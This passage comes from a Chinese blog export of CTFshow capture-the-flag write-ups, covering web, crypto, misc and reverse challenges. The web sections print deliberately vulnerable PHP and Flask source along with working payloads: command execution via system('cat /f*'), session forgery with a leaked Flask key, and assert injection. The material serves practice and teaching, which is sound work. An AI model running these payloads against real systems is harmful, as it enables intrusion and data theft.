single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$secret</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//echo var_dump($GLOBALS);</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test'</span><span class="token operator">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token number">999</span><span class="token punctuation">;</span>                <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test'</span><span class="token operator">.</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token number">666</span><span class="token punctuation">;</span>                <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-z0-9]/is'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello,the repairman!"</span><span class="token punctuation">;</span>                <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br&gt;hello,the user!We may change the mode to repaie the server,please keep it unchanged'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:5;url=index.php?mode=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 secret 后可以执行任意命令</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">[</span><span class="token constant">GET</span><span class="token punctuation">]</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>mode<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">[</span><span class="token constant">POST</span><span class="token punctuation">]</span>cmd<span class="token operator">=</span>tac config<span class="token operator">.</span>php <span class="token operator">&gt;</span> result<span class="token operator">.</span>php<span class="token punctuation">[</span><span class="token constant">HEADER</span><span class="token punctuation">]</span>Cookie<span class="token punctuation">:</span> secret<span class="token operator">=</span>da53eb34c1bc6ce7bbfcedf200148106<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后访问 result.php 获取 flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="1-easy-base"><a href="#1-easy-base" class="headerlink" title="1. easy_base"></a>1. easy_base</h3><p>密文：=0XezFWZfNXafRjNlNXYit3dvh2cmR3Y</p><p>逆序后 base64 解码</p><p><img src="/../attachments/Pasted%20image%2020221017132646.png"></p><h3 id="2-天知地知"><a href="#2-天知地知" class="headerlink" title="2. 天知地知"></a>2. 天知地知</h3><p>提示两者之差</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow{"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1000000000000</span><span class="token operator">-</span><span class="token number">981935301754</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-哇库哇库"><a href="#1-哇库哇库" class="headerlink" title="1. 哇库哇库"></a>1. 哇库哇库</h3><p>下载下来附件</p><p><img src="/../../../pic/Pasted%20image%2020221017130545.png"></p><p>提示密码为哇库哇库的拼音，使用 WAKUwaku 成功解压</p><p>第一个 hint </p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">wakuwaku→ukawukaw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>提示使用了逆序处理</p><p>第二个 hint</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">"最近女鹅吃了太多花生，脸都变宽了，于是给她在祖安用 海克斯 科技瘦脸瘦了200，没想到会变成这样"——劳埃德▪福杰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先将给的文件逆序处理</p><p><img src="/../../../pic/Pasted%20image%2020221017131001.png"></p><p>逆序之后的文件尾为 AE 42 60 82 属于 PNG 的文件尾，加上文件头 89 50 4E 47，将获得的图片的宽增加 200 获得原图</p><p>修改图片宽度为 741</p><p><img src="/../../../pic/1.png"></p><p>打开后获得 flag</p><p>修改正确宽高的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> binascii<span class="token keyword">import</span> structcrcbp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"乖女儿.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> crcbp<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> \            struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&gt;i'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&gt;i'</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token operator">+</span>crcbp<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span>        crc32 <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>crc32 <span class="token operator">==</span> <span class="token number">0xF86BACC4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hex:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-显卡坏了"><a href="#2-显卡坏了" class="headerlink" title="2. 显卡坏了"></a>2. 显卡坏了</h3><p>使用脚本修改</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageDrawimg<span class="token operator">=</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>outImg<span class="token operator">=</span>Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token operator">*</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>str_strlist <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> z <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        outImg<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">*</span><span class="token number">1500</span><span class="token operator">+</span>x<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">,</span>str_strlist<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>z<span class="token punctuation">]</span><span class="token punctuation">)</span>outImg<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'temp.png'</span><span class="token punctuation">)</span>img<span class="token operator">=</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'temp.png'</span><span class="token punctuation">)</span>str_strlist <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>outImg<span class="token operator">=</span>Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1600</span><span class="token punctuation">,</span><span class="token number">1200</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1500</span><span class="token operator">*</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                outImg<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">1600</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token operator">/</span><span class="token number">1600</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span>str_strlist<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>outImg<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'solve.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/solve.png"></p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="1-你newbee吗"><a href="#1-你newbee吗" class="headerlink" title="1. 你newbee吗"></a>1. 你newbee吗</h3><p>下载后使用 IDA 打开</p><p><img src="/../../../pic/Pasted%20image%2020221017133232.png"></p><h3 id="2-色图"><a href="#2-色图" class="headerlink" title="2. 色图"></a>2. 色图</h3><p><img src="/../../../pic/Pasted%20image%2020221017133818.png"></p><p>获取到图片的 base64 编码，<a href="https://www.toolhelper.cn/Image/Base64ToImage">转为图片</a>后使用 010Editor 获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - 菜狗杯</title>
      <link href="/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-cai-gou-bei/"/>
      <url>/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-cai-gou-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-菜狗杯"><a href="#CTF-秀-菜狗杯" class="headerlink" title="CTF 秀 - 菜狗杯"></a>CTF 秀 - 菜狗杯</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-web签到"><a href="#1-web签到" class="headerlink" title="1. web签到"></a>1. web签到</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTFshow-QQ群:'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的传参</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[COOKIE]CTFshow-QQ群:=a[POST]a=b&amp;c[6][0][7][5][8][0][9][4][4]=system('tac /f1agaaa');[GET]?b=c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-web2-c0me-t0-s1gn"><a href="#2-web2-c0me-t0-s1gn" class="headerlink" title="2. web2 c0me_t0_s1gn"></a>2. web2 c0me_t0_s1gn</h3><p>查看页面源代码</p><p><img src="/../../../pic/Pasted%20image%2020221119152557.png"></p><p>给出了前半部分 flag ，并在在最下面发现提示</p><p><img src="/../../../pic/Pasted%20image%2020221119152618.png"></p><p>打开控制台输入后获得后半部分 flag</p><h3 id="3-我的眼里只有"><a href="#3-我的眼里只有" class="headerlink" title="3. 我的眼里只有$"></a>3. 我的眼里只有$</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个劲的嵌套变量</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">[POST]_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=J&amp;I=system('cat /f*');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-抽老婆"><a href="#4-抽老婆" class="headerlink" title="4. 抽老婆"></a>4. 抽老婆</h3><p>在下载图片位置存在任意文件读取</p><p><img src="/../../../pic/Pasted%20image%2020221111225542.png"></p><p>读取下来题目源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python</span><span class="token comment"># -*-coding:utf-8 -*-</span><span class="token triple-quoted-string string">"""# File       : app.py# Time       ：2022/11/07 09:16# Author     ：g4_simon# version    ：python 3.9.7# Description：抽老婆，哇偶~"""</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token comment">#初始化全局变量</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'tanji_is_A_boy_Yooooooooooooooooooooo!'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getwifi'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getwifi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>    wifi<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'static/img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'current_wifi'</span><span class="token punctuation">]</span><span class="token operator">=</span>wifi    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'getwifi.html'</span><span class="token punctuation">,</span>wifi<span class="token operator">=</span>wifi<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     filename<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"你想干什么？"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"你怎么知道这个路径的？不过还好我有身份验证"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 python 3.9.7 搭建，如果需要获取 flag 的话需要 session 中的 isadmin 字段为真，源码中给出了加密的秘钥，使用 flask 伪造一个 session 即可</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">工具链接</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 flask_session_cookie_manager3.py  encode <span class="token parameter variable">-s</span> <span class="token string">"tanji_is_A_boy_Yooooooooooooooooooooo!"</span> <span class="token parameter variable">-t</span> <span class="token string">"{'isadmin':1}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">eyJpc2FkbWluIjoxfQ.Y25jWw.qn5WjsXcOTuALiwBhOXjJcczdRk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿着伪造出来的 session 访问目标功能页即可</p><p><img src="/../../../pic/Pasted%20image%2020221111230029.png"></p><h3 id="5-一言既出"><a href="#5-一言既出" class="headerlink" title="5. 一言既出"></a>5. 一言既出</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"一言既出，驷马难追!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进行第一处弱类型比较时会截取可读取到的数字</p><p>进行第二处处理时可以进行运算</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]num=114514%2B1805296<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="6-驷马难追"><a href="#6-驷马难追" class="headerlink" title="6. 驷马难追"></a>6. 驷马难追</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"一言既出，驷马难追!"</span><span class="token 